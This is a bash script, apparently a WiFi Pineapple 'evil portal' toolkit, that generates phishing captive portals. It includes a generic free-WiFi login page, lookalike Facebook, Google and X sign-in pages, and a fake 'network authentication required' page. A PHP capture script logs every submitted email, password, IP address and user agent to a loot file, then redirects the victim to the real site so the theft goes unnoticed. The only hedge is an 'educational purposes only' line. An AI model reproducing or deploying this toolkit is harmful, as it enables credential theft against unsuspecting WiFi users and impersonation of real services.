#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec Evil Portal Toolkit
# Captive portal generator with multiple templates
#
# For Hak5 WiFi Pineapple Pager
# Educational purposes only - Use responsibly
#
# Credits: Built for Hak5 devices - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

PORTAL_DIR="/mmc/portals"
LOOT_DIR="/mmc/loot/portals"
WWW_DIR="/www"
CAPTURED_LOG="$LOOT_DIR/captured_$(date +%Y%m%d).log"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${RED}"
    cat << 'EOF'
  ________      __ __   ____             __        __
 / ____/ |     / /_\ \ / __ \____  _____/ /_____ _/ /
/ __/  | | /| / / __/ // /_/ / __ \/ ___/ __/ __ `/ / 
/ /___ | |/ |/ / /_/ // ____/ /_/ / /  / /_/ /_/ / /  
\____/ |__/|__/____/ /_/    \____/_/   \__/\__,_/_/   
                                                      
    EVIL PORTAL TOOLKIT // NULLSEC
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[PORTAL]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

setup() {
    mkdir -p "$PORTAL_DIR"
    mkdir -p "$LOOT_DIR"
    mkdir -p "$WWW_DIR"
}

# Generate WiFi login portal (hotel/coffee shop style)
create_wifi_portal() {
    local name="${1:-Free_WiFi}"
    local dir="$PORTAL_DIR/$name"
    
    log "Creating WiFi login portal: $name"
    mkdir -p "$dir"
    
    # Main HTML page
    cat > "$dir/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 40px;
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 60px; height: 60px; fill: #667eea; }
        h1 { text-align: center; color: #333; margin-bottom: 10px; font-size: 24px; }
        .subtitle { text-align: center; color: #666; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #333; margin-bottom: 8px; font-weight: 500; }
        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus { outline: none; border-color: #667eea; }
        .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; }
        .checkbox-group input { margin-right: 10px; }
        .checkbox-group label { margin: 0; font-size: 14px; color: #666; }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102,126,234,0.4); }
        .terms { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
        .terms a { color: #667eea; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
        </div>
        <h1>Free WiFi Access</h1>
        <p class="subtitle">Sign in to continue browsing</p>
        <form action="/capture.php" method="POST">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" placeholder="your@email.com" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="••••••••" required>
            </div>
            <div class="checkbox-group">
                <input type="checkbox" id="terms" required>
                <label for="terms">I agree to the Terms of Service</label>
            </div>
            <input type="hidden" name="portal" value="wifi_login">
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="terms">By connecting, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
    </div>
</body>
</html>
HTMLEOF

    log "WiFi login portal created at: $dir"
}

# Generate social media login portal
create_social_portal() {
    local platform="${1:-facebook}"
    local dir="$PORTAL_DIR/${platform}_login"
    
    log "Creating social media portal: $platform"
    mkdir -p "$dir"
    
    case "$platform" in
        facebook)
            create_facebook_portal "$dir"
            ;;
        google)
            create_google_portal "$dir"
            ;;
        twitter)
            create_twitter_portal "$dir"
            ;;
        *)
            create_generic_social_portal "$dir" "$platform"
            ;;
    esac
    
    log "Social portal created at: $dir"
}

create_facebook_portal() {
    local dir="$1"
    
    cat > "$dir/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log into Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .wrapper { max-width: 400px; margin: 50px auto; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 48px; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        input:focus { border-color: #1877f2; outline: none; }
        button { width: 100%; padding: 14px; background: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
        button:hover { background: #166fe5; }
        .forgot { text-align: center; margin: 16px 0; }
        .forgot a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .divider { border-top: 1px solid #ddd; margin: 20px 0; }
        .create { text-align: center; }
        .create button { background: #42b72a; width: auto; padding: 14px 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="logo"><h1>facebook</h1></div>
        <div class="box">
            <form action="/capture.php" method="POST">
                <input type="text" name="email" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="hidden" name="portal" value="facebook">
                <button type="submit">Log In</button>
            </form>
            <div class="forgot"><a href="#">Forgotten password?</a></div>
            <div class="divider"></div>
            <div class="create"><button>Create New Account</button></div>
        </div>
    </div>
</body>
</html>
HTMLEOF
}

create_google_portal() {
    local dir="$1"
    
    cat > "$dir/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo svg { height: 24px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 32px; }
        .form-group { margin-bottom: 24px; position: relative; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        label { position: absolute; top: -10px; left: 10px; background: white; padding: 0 4px; color: #5f6368; font-size: 12px; }
        .links { margin-bottom: 32px; }
        .links a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .buttons { display: flex; justify-content: space-between; align-items: center; }
        .create { color: #1a73e8; text-decoration: none; font-weight: 500; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24"><g fill="none"><path d="M0 0h75v24H0z"/><path fill="#4285F4" d="M30.6 12.2c0-.6 0-1.1-.1-1.6h-6.8v3h3.9c-.2.9-.7 1.7-1.4 2.2v1.8h2.3c1.3-1.2 2.1-3 2.1-5.4z"/><path fill="#34A853" d="M23.7 19c1.9 0 3.4-.6 4.6-1.7l-2.3-1.8c-.6.4-1.4.7-2.3.7-1.8 0-3.3-1.2-3.8-2.8h-2.4v1.9c1.2 2.4 3.6 3.7 6.2 3.7z"/><path fill="#FBBC04" d="M19.9 13.4c-.3-.8-.3-1.7 0-2.5V9H17.5c-1 2-1 4.3 0 6.3l2.4-1.9z"/><path fill="#EA4335" d="M23.7 8.2c1 0 1.9.3 2.6 1l1.9-1.9c-1.2-1.1-2.8-1.8-4.5-1.8-2.6 0-5 1.4-6.2 3.6l2.4 1.9c.5-1.6 2-2.8 3.8-2.8z"/></g></svg>
            <svg viewBox="0 0 40 24"><path fill="#5F6368" d="M13.5 11c0-.5-.4-.9-.9-.9H5v1.8h4.4c-.2 1.7-1.7 2.5-3.4 2.5-2.1 0-3.9-1.7-3.9-3.9s1.8-4 3.9-4c1 0 1.9.4 2.6 1l1.3-1.4C9 5.3 7.6 4.8 6 4.8c-3.2 0-5.7 2.5-5.7 5.7s2.5 5.6 5.7 5.6c2.7 0 5.2-1.7 5.5-5.1zm3.4 4.9c-1.9 0-3.4-1.6-3.4-3.4 0-1.9 1.5-3.5 3.4-3.5s3.4 1.6 3.4 3.5c0 1.8-1.5 3.4-3.4 3.4zm0-5.3c-1 0-1.8.8-1.8 1.8s.8 1.8 1.8 1.8 1.8-.8 1.8-1.8-.8-1.8-1.8-1.8zm10 5.3c-1.9 0-3.4-1.6-3.4-3.4 0-1.9 1.5-3.5 3.4-3.5s3.4 1.6 3.4 3.5c0 1.8-1.5 3.4-3.4 3.4zm0-5.3c-1 0-1.8.8-1.8 1.8s.8 1.8 1.8 1.8 1.8-.8 1.8-1.8-.8-1.8-1.8-1.8zm7.7 5.1h-.1c-.3.4-.9.8-1.6.8-1.5 0-2.6-1.2-2.6-2.7v-4.6h1.6v4.4c0 .8.6 1.4 1.3 1.4.8 0 1.3-.6 1.3-1.4v-4.4H36v6.5h-1.4v-.1z"/></svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form action="/capture.php" method="POST">
            <div class="form-group">
                <input type="email" name="email" required>
                <label>Email or phone</label>
            </div>
            <div class="form-group">
                <input type="password" name="password" required>
                <label>Password</label>
            </div>
            <input type="hidden" name="portal" value="google">
            <div class="links"><a href="#">Forgot email?</a></div>
            <div class="buttons">
                <a class="create" href="#">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
</body>
</html>
HTMLEOF
}

create_twitter_portal() {
    local dir="$1"
    
    cat > "$dir/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to X</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 400px; padding: 32px; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { height: 40px; fill: #fff; }
        h1 { color: #e7e9ea; font-size: 31px; text-align: center; margin-bottom: 32px; }
        input { width: 100%; padding: 18px 12px; background: #000; border: 1px solid #333; border-radius: 4px; color: #e7e9ea; font-size: 17px; margin-bottom: 16px; box-sizing: border-box; }
        input:focus { border-color: #1d9bf0; outline: none; }
        input::placeholder { color: #71767b; }
        button { width: 100%; padding: 16px; background: #fff; border: none; border-radius: 50px; color: #0f1419; font-size: 17px; font-weight: bold; cursor: pointer; margin-bottom: 24px; }
        button:hover { background: #e6e6e6; }
        .forgot { text-align: center; color: #1d9bf0; margin-bottom: 24px; }
        .forgot a { color: #1d9bf0; text-decoration: none; }
        .signup { text-align: center; color: #71767b; }
        .signup a { color: #1d9bf0; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        </div>
        <h1>Sign in to X</h1>
        <form action="/capture.php" method="POST">
            <input type="text" name="email" placeholder="Phone, email, or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="portal" value="twitter">
            <button type="submit">Log in</button>
        </form>
        <div class="forgot"><a href="#">Forgot password?</a></div>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
    </div>
</body>
</html>
HTMLEOF
}

create_generic_social_portal() {
    local dir="$1"
    local platform="$2"
    
    cat > "$dir/index.html" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to ${platform}</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 400px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; margin-bottom: 32px; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; margin-bottom: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #0066ff; border: none; border-radius: 4px; color: white; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sign in to ${platform}</h1>
        <form action="/capture.php" method="POST">
            <input type="text" name="email" placeholder="Email or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="hidden" name="portal" value="${platform}">
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
HTMLEOF
}

# Create captive portal (network update style)
create_update_portal() {
    local dir="$PORTAL_DIR/network_update"
    
    log "Creating network update portal..."
    mkdir -p "$dir"
    
    cat > "$dir/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Authentication Required</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1e3a5f; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 12px; max-width: 450px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
        .icon { font-size: 64px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 24px; line-height: 1.6; }
        .warning { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 16px; margin-bottom: 24px; }
        .warning p { margin: 0; color: #856404; }
        input { width: 100%; padding: 14px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; margin-bottom: 16px; box-sizing: border-box; }
        input:focus { border-color: #1e3a5f; outline: none; }
        button { width: 100%; padding: 14px; background: #1e3a5f; border: none; border-radius: 8px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background: #2a4a6f; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔐</div>
        <h1>Network Authentication Required</h1>
        <p>Your device requires re-authentication to continue using this network. Please verify your credentials.</p>
        <div class="warning">
            <p>⚠️ This is a security verification to protect your connection.</p>
        </div>
        <form action="/capture.php" method="POST">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Network password" required>
            <input type="hidden" name="portal" value="network_update">
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
HTMLEOF

    log "Network update portal created at: $dir"
}

# PHP capture script
create_capture_script() {
    log "Creating capture script..."
    
    cat > "$WWW_DIR/capture.php" << 'PHPEOF'
<?php
// NullSec Portal Capture Script
// Credits: Built for Hak5 WiFi Pineapple

$loot_dir = "/mmc/loot/portals";
$log_file = $loot_dir . "/captured_" . date("Ymd") . ".log";

// Create loot directory if needed
if (!is_dir($loot_dir)) {
    mkdir($loot_dir, 0755, true);
}

// Capture credentials
$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$portal = isset($_POST['portal']) ? $_POST['portal'] : 'unknown';
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Log captured data
$log_entry = "═══════════════════════════════════════════════════════════════\n";
$log_entry .= "Timestamp: $timestamp\n";
$log_entry .= "Portal: $portal\n";
$log_entry .= "Client IP: $ip\n";
$log_entry .= "User Agent: $user_agent\n";
$log_entry .= "Email/Username: $email\n";
$log_entry .= "Password: $password\n";
$log_entry .= "═══════════════════════════════════════════════════════════════\n\n";

file_put_contents($log_file, $log_entry, FILE_APPEND);

// Redirect to real site or success page
$redirects = [
    'facebook' => 'https://www.facebook.com',
    'google' => 'https://www.google.com',
    'twitter' => 'https://www.x.com',
    'wifi_login' => 'https://www.google.com',
    'network_update' => 'https://www.google.com'
];

$redirect_url = isset($redirects[$portal]) ? $redirects[$portal] : 'https://www.google.com';

header("Location: $redirect_url");
exit;
?>
PHPEOF

    log "Capture script created"
}

# Deploy portal
deploy_portal() {
    local portal_name="$1"
    local portal_path="$PORTAL_DIR/$portal_name"
    
    if [ ! -d "$portal_path" ]; then
        error "Portal not found: $portal_name"
    fi
    
    log "Deploying portal: $portal_name"
    
    # Backup existing www
    [ -d "$WWW_DIR/backup" ] || mkdir -p "$WWW_DIR/backup"
    cp -r "$WWW_DIR"/* "$WWW_DIR/backup/" 2>/dev/null
    
    # Deploy portal
    cp -r "$portal_path"/* "$WWW_DIR/"
    
    # Ensure capture script exists
    create_capture_script
    
    log "Portal deployed to: $WWW_DIR"
    log "Captured credentials will be saved to: $LOOT_DIR"
}

# List available portals
list_portals() {
    log "Available portals:"
    echo ""
    
    if [ -d "$PORTAL_DIR" ]; then
        for portal in "$PORTAL_DIR"/*; do
            if [ -d "$portal" ]; then
                local name=$(basename "$portal")
                echo "  - $name"
            fi
        done
    else
        echo "  No portals found. Create some first!"
    fi
    echo ""
}

# View captured credentials
view_loot() {
    log "Captured credentials:"
    echo ""
    
    if [ -d "$LOOT_DIR" ]; then
        for log_file in "$LOOT_DIR"/*.log; do
            if [ -f "$log_file" ]; then
                echo "=== $(basename "$log_file") ==="
                cat "$log_file"
                echo ""
            fi
        done
    else
        echo "  No loot found."
    fi
}

# Generate all portals
generate_all() {
    log "Generating all portal templates..."
    
    create_wifi_portal "Free_WiFi"
    create_social_portal "facebook"
    create_social_portal "google"
    create_social_portal "twitter"
    create_update_portal
    create_capture_script
    
    log "All portals generated!"
}

# Show usage
usage() {
    echo "NullSec Evil Portal Toolkit"
    echo ""
    echo "Usage: $0 <command> [options]"
    echo ""
    echo "Commands:"
    echo "  create wifi [name]      Create WiFi login portal"
    echo "  create social <type>    Create social media portal (facebook/google/twitter)"
    echo "  create update           Create network update portal"
    echo "  generate-all            Generate all portal templates"
    echo "  deploy <portal>         Deploy a portal to web server"
    echo "  list                    List available portals"
    echo "  loot                    View captured credentials"
    echo ""
    echo "Examples:"
    echo "  $0 create wifi CoffeeShop_Guest"
    echo "  $0 create social facebook"
    echo "  $0 deploy facebook_login"
    echo ""
    echo "Credits: Built for Hak5 WiFi Pineapple - https://hak5.org"
}

# Main
main() {
    banner
    setup
    
    case "${1:-}" in
        create)
            case "${2:-}" in
                wifi)
                    create_wifi_portal "${3:-Free_WiFi}"
                    ;;
                social)
                    create_social_portal "${3:-facebook}"
                    ;;
                update)
                    create_update_portal
                    ;;
                *)
                    usage
                    ;;
            esac
            ;;
        generate-all)
            generate_all
            ;;
        deploy)
            [ -z "$2" ] && { echo "Usage: $0 deploy <portal>"; exit 1; }
            deploy_portal "$2"
            ;;
        list)
            list_portals
            ;;
        loot)
            view_loot
            ;;
        help|--help|-h)
            usage
            ;;
        *)
            usage
            exit 1
            ;;
    esac
}

main "$@"
